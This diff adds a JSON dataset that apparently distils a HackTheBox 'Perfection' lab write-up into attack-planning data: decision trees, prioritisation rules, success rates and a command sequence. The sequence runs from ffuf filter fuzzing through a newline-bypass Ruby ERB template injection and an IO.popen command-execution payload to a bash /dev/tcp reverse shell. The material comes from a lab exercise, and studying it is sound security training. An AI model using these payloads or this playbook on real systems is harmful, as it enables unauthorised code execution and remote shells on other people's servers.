@@ -1,0 +1,826 @@
+{
+  "writeup_id": "Htb_Perfection",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_ruby_ssti_webapp",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+nginx+webrick",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "server_side_template_injection",
+    "privilege_path": "web_user_to_root",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "ruby_webrick_server",
+      "sinatra_framework",
+      "input_filter_bypass",
+      "newline_injection",
+      "ssti_vulnerability"
+    ],
+    "environmental_clues": [
+      "webrick_1.7.0_footer",
+      "sinatra_404_page",
+      "grade_calculator_webapp",
+      "malicious_input_blocked_message"
+    ],
+    "similar_scenarios": [
+      "ruby_webapp_ssti",
+      "template_injection_easy"
+    ],
+    "unique_aspects": [
+      "weighted_grade_calculator",
+      "character_blocklist_filter",
+      "hashcat_rules_privilege_escalation",
+      "database_hash_cracking"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Newline Injection Bypass",
+        "success_reason": "Input filter only checked for malicious characters but not newline characters",
+        "prerequisite_indicators": [
+          "input_validation_present",
+          "character_blacklist_filtering",
+          "server_side_processing"
+        ],
+        "recognition_patterns": [
+          "malicious input blocked message",
+          "specific characters trigger filtering",
+          "newlines not in blacklist"
+        ],
+        "failure_modes": [
+          "comprehensive_input_validation",
+          "whitelist_instead_of_blacklist",
+          "proper_encoding_handling"
+        ],
+        "environmental_factors": [
+          "ruby_sinatra_framework",
+          "incomplete_input_sanitization",
+          "developer_oversight"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "Ruby SSTI (Server-Side Template Injection)",
+        "success_reason": "ERB template engine processed user input without proper sanitization",
+        "prerequisite_indicators": [
+          "ruby_webrick_server",
+          "sinatra_framework",
+          "user_input_in_templates"
+        ],
+        "recognition_patterns": [
+          "erb template syntax works",
+          "ruby code execution possible",
+          "webrick/sinatra stack identified"
+        ],
+        "failure_modes": [
+          "input_properly_escaped",
+          "template_engine_sandboxed",
+          "no_user_input_in_templates"
+        ],
+        "environmental_factors": [
+          "ruby_erb_templating",
+          "insufficient_output_encoding",
+          "direct_template_interpolation"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "Hashcat Rule-Based Cracking",
+        "success_reason": "Password followed predictable format hinted at in database",
+        "prerequisite_indicators": [
+          "password_hashes_found",
+          "password_format_hints_available",
+          "weak_password_policy"
+        ],
+        "recognition_patterns": [
+          "database contains password hints",
+          "structured password format",
+          "hashcat rules applicable"
+        ],
+        "failure_modes": [
+          "strong_random_passwords",
+          "no_format_hints",
+          "salted_hashes"
+        ],
+        "environmental_factors": [
+          "predictable_password_patterns",
+          "internal_password_policy",
+          "user_behavior_patterns"
+        ],
+        "success_probability": 0.7,
+        "typical_timeframe": "30-60 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Character blacklist bypass via newlines",
+        "discovery_method": "ffuf fuzzing and manual testing",
+        "why_critical": "Enabled bypassing input validation to reach SSTI",
+        "how_to_recognize": [
+          "malicious input blocked errors",
+          "specific character filtering",
+          "newline characters not filtered"
+        ],
+        "follow_up_actions": [
+          "test_newline_injection",
+          "attempt_template_injection",
+          "escalate_to_code_execution"
+        ]
+      },
+      {
+        "discovery": "Ruby ERB template injection",
+        "discovery_method": "Testing template syntax after filter bypass",
+        "why_critical": "Direct path to remote code execution",
+        "how_to_recognize": [
+          "ruby/sinatra technology stack",
+          "user input reflected in responses",
+          "erb syntax evaluation"
+        ],
+        "follow_up_actions": [
+          "test_ruby_code_execution",
+          "establish_reverse_shell",
+          "enumerate_system"
+        ]
+      },
+      {
+        "discovery": "Database with password format hints",
+        "discovery_method": "File system enumeration after shell access",
+        "why_critical": "Provided pattern for cracking root password",
+        "how_to_recognize": [
+          "sqlite database files",
+          "password format documentation",
+          "structured password hints"
+        ],
+        "follow_up_actions": [
+          "extract_password_hashes",
+          "analyze_password_patterns",
+          "create_hashcat_rules"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "web_application",
+        "escalation_method": "SSTI_to_RCE",
+        "why_possible": "ERB template engine executed Ruby code from user input",
+        "recognition_signs": [
+          "ruby_template_engine",
+          "user_input_in_templates",
+          "insufficient_sanitization"
+        ],
+        "exploitation_path": "Newline bypass → ERB injection → Ruby RCE → Shell"
+      },
+      {
+        "privilege_level": "user_susan",
+        "escalation_method": "Password_Pattern_Cracking",
+        "why_possible": "Root password followed predictable internal format",
+        "recognition_signs": [
+          "database_with_password_hints",
+          "structured_password_format",
+          "weak_password_policy"
+        ],
+        "exploitation_path": "Database discovery → Pattern analysis → Hashcat rules → Root access"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only ports 22 (SSH) and 80 (HTTP) open on Linux host",
+        "decision": "Focus on web application enumeration and exploitation",
+        "reasoning": "Limited attack surface with only web service accessible",
+        "confidence": 0.95,
+        "alternatives": [
+          {
+            "option": "ssh_brute_force",
+            "when": "if web exploitation fails"
+          },
+          {
+            "option": "service_version_exploits",
+            "when": "if known CVEs exist"
+          }
+        ],
+        "success_indicators": [
+          "web_application_identified",
+          "technology_stack_discovered",
+          "input_validation_weaknesses_found"
+        ],
+        "next_decision": "analyze_web_application_technology"
+      },
+      {
+        "step": 2,
+        "situation": "Identified Ruby/Sinatra web application with WEBrick server",
+        "decision": "Test for server-side template injection (SSTI) vulnerabilities",
+        "reasoning": "Ruby template engines are commonly vulnerable to SSTI attacks",
+        "confidence": 0.85,
+        "prerequisites": [
+          "ruby_framework_confirmed",
+          "user_input_fields_identified"
+        ],
+        "success_indicators": [
+          "template_injection_confirmed",
+          "code_execution_achieved"
+        ],
+        "failure_fallbacks": [
+          "parameter_pollution",
+          "file_inclusion",
+          "sql_injection"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Input validation blocking special characters",
+        "decision": "Attempt newline injection to bypass character filters",
+        "reasoning": "Regex filters often don't account for newline characters in validation",
+        "confidence": 0.75,
+        "prerequisites": [
+          "blocked_characters_identified",
+          "form_input_available"
+        ],
+        "success_indicators": [
+          "filter_bypass_successful",
+          "payload_execution_confirmed"
+        ],
+        "failure_fallbacks": [
+          "encoding_bypass",
+          "parameter_pollution",
+          "alternative_injection_points"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_web_app_identified": {
+        "action": "enumerate_technology_stack",
+        "tools": [
+          "nmap",
+          "whatweb",
+          "wappalyzer"
+        ],
+        "next_phase": "identify_injection_points"
+      },
+      "if_ruby_framework_detected": {
+        "action": "test_for_ssti_vulnerabilities",
+        "payloads": [
+          "erb_templates",
+          "ruby_code_injection"
+        ],
+        "decision_criteria": "based_on_template_engine_type"
+      },
+      "if_input_filtering_detected": {
+        "action": "attempt_filter_bypass",
+        "techniques": [
+          "newline_injection",
+          "encoding_bypass",
+          "parameter_pollution"
+        ],
+        "success_criteria": "payload_execution_without_blocking"
+      },
+      "if_code_execution_achieved": {
+        "action": "establish_reverse_shell",
+        "tools": [
+          "netcat",
+          "python",
+          "bash"
+        ],
+        "next_phase": "privilege_escalation_enumeration"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "prioritize_ssti_testing_on_ruby_applications",
+        "reasoning": "high_success_rate_for_code_execution",
+        "applicability": "ruby_sinatra_erb_applications"
+      },
+      {
+        "rule": "test_newline_injection_when_special_chars_blocked",
+        "reasoning": "common_regex_bypass_technique",
+        "applicability": "input_validation_with_character_filtering"
+      },
+      {
+        "rule": "enumerate_local_files_after_shell_access",
+        "reasoning": "often_contains_credentials_and_escalation_paths",
+        "applicability": "initial_shell_access_obtained"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Server-Side Template Injection (SSTI)",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "ruby_webrick_server",
+          "sinatra_framework",
+          "template_engine_present",
+          "user_input_processed"
+        ],
+        "success_indicators": [
+          "webrick_server_header",
+          "sinatra_404_page",
+          "ruby_version_disclosure",
+          "template_processing_errors"
+        ],
+        "incompatible_with": [
+          "strict_input_validation",
+          "template_sandboxing",
+          "waf_protection"
+        ],
+        "confidence_boosters": [
+          "input_filter_bypass_possible",
+          "newline_injection_works",
+          "ruby_erb_syntax_accepted"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "15-30 minutes"
+      },
+      {
+        "technique": "Input Filter Bypass",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "input_validation_exists",
+          "character_blacklist_implemented"
+        ],
+        "success_indicators": [
+          "malicious_input_blocked_message",
+          "character_filtering_detected",
+          "form_input_processing"
+        ],
+        "incompatible_with": [
+          "whitelist_validation",
+          "comprehensive_encoding_checks",
+          "multiple_validation_layers"
+        ],
+        "confidence_boosters": [
+          "newline_characters_not_filtered",
+          "url_encoding_accepted",
+          "partial_character_blocking"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "Hash Cracking",
+        "mitre_id": "T1110.002",
+        "required_services": [
+          "any"
+        ],
+        "required_ports": [],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "password_hashes_obtained",
+          "hash_format_identified",
+          "password_pattern_hints_available"
+        ],
+        "success_indicators": [
+          "database_files_found",
+          "hash_format_recognized",
+          "password_policy_hints_discovered"
+        ],
+        "incompatible_with": [
+          "strong_random_passwords",
+          "salted_hashes_unknown_salt",
+          "key_stretching_high_iterations"
+        ],
+        "confidence_boosters": [
+          "password_format_hints_found",
+          "weak_password_patterns",
+          "hashcat_rules_applicable"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "30-120 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "ruby_sinatra_app": {
+        "port_indicators": [
+          80,
+          443,
+          3000,
+          4567
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "WEBrick",
+          "Sinatra",
+          "Ruby"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "nginx",
+          "apache",
+          "iis"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "ubuntu_linux": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh"
+        ],
+        "banner_indicators": [
+          "OpenSSH 8.9p1 Ubuntu"
+        ],
+        "confidence_threshold": 0.95
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "ssti_exploitation",
+          "when": "ruby_sinatra_detected",
+          "reason": "high_success_rate_with_rce_potential"
+        },
+        {
+          "attack": "input_filter_bypass",
+          "when": "input_validation_detected",
+          "reason": "often_leads_to_further_exploitation"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "may_reveal_additional_endpoints"
+        },
+        {
+          "attack": "hash_cracking",
+          "when": "database_files_found",
+          "reason": "reliable_privilege_escalation_method"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "ssh_bruteforce",
+          "when": "ssh_service_detected",
+          "reason": "time_consuming_low_success_rate"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Newline Injection Bypass",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "ffuf",
+            "command_template": "ffuf -u {url} -d '{post_data}' -w {wordlist} -mr {match_regex}",
+            "actual_command": "ffuf -u http://10.10.11.253/weighted-grade-calc -d 'category1=FUZZ&grade1=80&weight1=25&category2=Literature&grade2=100&weight2=55&category3=Physics&grade3=93&weight3=20&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0' -w /opt/SecLists/Fuzzing/alphanum-case-extra.txt -mr Malicious",
+            "output_pattern": "Status: 200, Size: 5221",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "burp_repeater",
+            "command_template": "category1=0xdf%0a{payload}",
+            "actual_command": "category1=0xdf%0a<%25= 7*7 %25>",
+            "success_factors": [
+              "regex_anchoring_bypass",
+              "newline_character_allowed"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "input_validation_using_regex",
+          "regex_not_multiline_aware",
+          "newline_characters_not_filtered"
+        ],
+        "success_indicators": [
+          "blocked_characters_accepted_after_newline",
+          "application_processes_payload_normally",
+          "no_malicious_input_blocked_message"
+        ],
+        "common_failures": [
+          "multiline_regex_flags_enabled",
+          "newline_characters_also_filtered",
+          "backend_strips_newlines"
+        ],
+        "follow_up_techniques": [
+          "server_side_template_injection",
+          "command_injection",
+          "sql_injection"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Ruby ERB Server-Side Template Injection",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "erb_injection",
+            "command_template": "<%25= {ruby_code} %25>",
+            "actual_command": "<%25= IO.popen('id').readlines() %25>",
+            "output_pattern": "uid=1001(susan) gid=1001(susan)",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "reverse_shell",
+            "command_template": "<%25= IO.popen('bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"').readlines() %25>",
+            "actual_command": "<%25= IO.popen('bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"').readlines() %25>",
+            "success_factors": [
+              "outbound_connections_allowed",
+              "bash_available"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "erb_templating_engine_in_use",
+          "user_input_rendered_in_template",
+          "input_validation_bypassed"
+        ],
+        "success_indicators": [
+          "mathematical_expressions_evaluated",
+          "system_commands_executed",
+          "reverse_shell_connection_established"
+        ],
+        "common_failures": [
+          "template_engine_not_erb",
+          "output_sanitized_before_display",
+          "restricted_execution_environment"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "credential_harvesting",
+          "lateral_movement"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Web Application Reconnaissance",
+        "mitre_id": "T1595.002",
+        "category": "reconnaissance",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "nmap",
+            "command_template": "nmap -p- --min-rate 10000 {target}",
+            "actual_command": "nmap -p- --min-rate 10000 10.10.11.253",
+            "output_pattern": "PORT   STATE SERVICE",
+            "effectiveness_rating": 5,
+            "reliability": 0.99
+          },
+          {
+            "name": "feroxbuster",
+            "command_template": "feroxbuster -u {url}",
+            "actual_command": "feroxbuster -u http://10.10.11.253",
+            "success_factors": [
+              "common_directory_names",
+              "no_rate_limiting"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "target_accessible",
+          "web_service_running"
+        ],
+        "success_indicators": [
+          "open_ports_identified",
+          "web_technology_stack_identified",
+          "application_endpoints_discovered"
+        ],
+        "common_failures": [
+          "aggressive_rate_limiting",
+          "waf_blocking_requests",
+          "non_standard_ports"
+        ],
+        "follow_up_techniques": [
+          "input_validation_testing",
+          "authentication_bypass",
+          "injection_attacks"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "ffuf",
+        "use_case": "character_blacklist_identification",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "input_validation_testing"
+        ],
+        "alternatives": [
+          "burp_intruder",
+          "manual_testing"
+        ],
+        "best_practices": [
+          "use_comprehensive_character_wordlists",
+          "filter_responses_by_content_patterns",
+          "test_encoding_variations"
+        ]
+      },
+      {
+        "tool": "nmap",
+        "use_case": "port_and_service_discovery",
+        "effectiveness_rating": 5,
+        "reliability": 0.99,
+        "learning_curve": "low",
+        "essential_for": [
+          "initial_reconnaissance"
+        ],
+        "alternatives": [
+          "masscan",
+          "rustscan"
+        ],
+        "best_practices": [
+          "start_with_fast_port_scan",
+          "follow_up_with_service_detection",
+          "use_appropriate_timing_templates"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "newline_injection_to_ssti_rce",
+        "steps": [
+          {
+            "step": 1,
+            "command": "ffuf -u http://10.10.11.253/weighted-grade-calc -d 'category1=FUZZ&grade1=80&weight1=25&category2=Literature&grade2=100&weight2=55&category3=Physics&grade3=93&weight3=20&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0' -w /opt/SecLists/Fuzzing/alphanum-case-extra.txt -mr Malicious",
+            "purpose": "Identify blocked characters",
+            "expected_output": "List of characters returning 'Malicious input blocked'"
+          },
+          {
+            "step": 2,
+            "command": "category1=0xdf%0a<%25= 7*7 %25>",
+            "purpose": "Test SSTI with newline bypass",
+            "expected_output": "49 displayed in response"
+          },
+          {
+            "step": 3,
+            "command": "category1=0xdf%0a<%25= IO.popen('id').readlines() %25>",
+            "purpose": "Confirm command execution",
+            "expected_output": "uid=1001(susan) gid=1001(susan)"
+          },
+          {
+            "step": 4,
+            "command": "category1=0xdf%0a<%25= IO.popen('bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"').readlines() %25>",
+            "purpose": "Execute reverse shell",
+            "expected_output": "Shell connection as susan user"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "20-40 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Perfection",
+      "difficulty": "Easy",
+      "os": "Ubuntu 22.04",
+      "platform": "HackTheBox",
+      "release_date": "2024-03-02",
+      "author": "TheRedeemed1",
+      "estimated_time": "30-45 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "web_application",
+        "template_injection"
+      ],
+      "key_vulnerabilities": [
+        "server_side_template_injection",
+        "input_filter_bypass",
+        "weak_password_policy"
+      ],
+      "environment_type": "web_application_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "ssti_exploitation",
+        "filter_bypass_techniques",
+        "password_cracking"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_security",
+        "ruby_templating",
+        "hashcat_usage"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "template_injection",
+        "privilege_escalation",
+        "password_cracking"
+      ],
+      "attack_types": [
+        "injection",
+        "credential_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "secure_templating",
+        "strong_password_policies"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Templated",
+        "Shoppy",
+        "Precious"
+      ],
+      "similarity_reasons": [
+        "template_injection",
+        "web_exploitation",
+        "hash_cracking"
+      ],
+      "unique_aspects": [
+        "newline_injection_bypass",
+        "ruby_erb_templates",
+        "grade_calculator_theme"
+      ],
+      "difficulty_factors": [
+        "straightforward_ssti",
+        "clear_attack_path",
+        "standard_privilege_escalation"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T21:31:43.624500",
+    "original_file": "0xdf_writeups/Htb Perfection.md",
+    "content_length": 30439,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
